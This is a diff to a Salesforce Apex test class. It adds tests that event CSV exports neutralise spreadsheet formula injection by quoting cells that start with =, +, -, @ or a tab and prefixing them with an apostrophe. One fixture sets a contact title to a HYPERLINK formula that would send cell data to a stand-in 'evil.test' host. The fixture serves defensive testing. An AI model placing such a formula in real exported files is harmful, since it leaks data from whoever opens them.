@@ -135,6 +135,9 @@ private class EventWorkflowTest {
         Contact emily = [SELECT Id FROM Contact WHERE Email = 'emily@acme.test'];
         Contact james = [SELECT Id FROM Contact WHERE Email = 'james@nordbank.test'];
 
+        // A Title any AM could set, and that Excel would execute on open.
+        update new Contact(Id = emily.Id, Title = '=HYPERLINK("http://evil.test?d="&A1,"Invoice")');
+
         System.runAs(alex) {
             InviteeSelectorController.addInvitees(gala.Id, new List<Id>{ emily.Id });
             InviteeSelectorController.submitMyInvitees(gala.Id);
@@ -170,6 +173,10 @@ private class EventWorkflowTest {
                 'Cross-event file needs the event columns');
             System.assert(ex.csv.contains('\r\n'), 'CRLF line endings — desktop Excel chokes on bare LF');
             System.assert(ex.csv.contains('"FinTech Summit, 2026"'), 'A value with a comma must be quoted');
+            System.assert(ex.csv.contains('"\'=HYPERLINK('),
+                'A formula-shaped Title must reach the file neutralised: ' + ex.csv);
+            System.assert(!ex.csv.contains(',=HYPERLINK'),
+                'A bare formula must never start a cell');
             System.assertEquals(2, [SELECT COUNT() FROM Event_Invitee__c WHERE Status__c = 'Exported'],
                 'Downloading everything marks everything Exported');
 
@@ -245,6 +252,33 @@ private class EventWorkflowTest {
             System.assertEquals(1, EventExportController.exportAllApproved(false, jul01, null).rowCount);
             System.assertEquals(1, EventExportController.exportAllApproved(false, null, jul01).rowCount);
         }
+    }
+
+    /**
+     * CSV formula injection: exported values are AM-editable (Contact Title, Account
+     * name, event name) or arrive via the .xlsx import, so a cell must never reach
+     * Excel in a state it will evaluate.
+     */
+    @IsTest
+    static void csvCellNeutralisesFormulaTriggers() {
+        for (String trigger : new List<String>{ '=', '+', '-', '@' }) {
+            System.assertEquals(
+                '"\'' + trigger + '1+1"',
+                EventExportController.csvCell(trigger + '1+1'),
+                'A cell opening with ' + trigger + ' must be quoted and prefixed with an apostrophe');
+        }
+        // Tab and CR are triggers too — Excel skips them before parsing what follows.
+        System.assert(EventExportController.csvCell('\t=1+1').startsWith('"\'\t='),
+            'A leading tab must not smuggle a formula past the guard');
+
+        // Ordinary values are untouched; existing quoting behaviour is unchanged.
+        System.assertEquals('Emily Carter', EventExportController.csvCell('Emily Carter'));
+        System.assertEquals('"Acme, Inc"', EventExportController.csvCell('Acme, Inc'));
+        System.assertEquals('"He said ""hi"""', EventExportController.csvCell('He said "hi"'));
+        System.assertEquals('', EventExportController.csvCell(null));
+        System.assertEquals('', EventExportController.csvCell(''));
+        // Only the first character matters — a hyphen mid-value is not a trigger.
+        System.assertEquals('Vice-President', EventExportController.csvCell('Vice-President'));
     }
 
     @IsTest
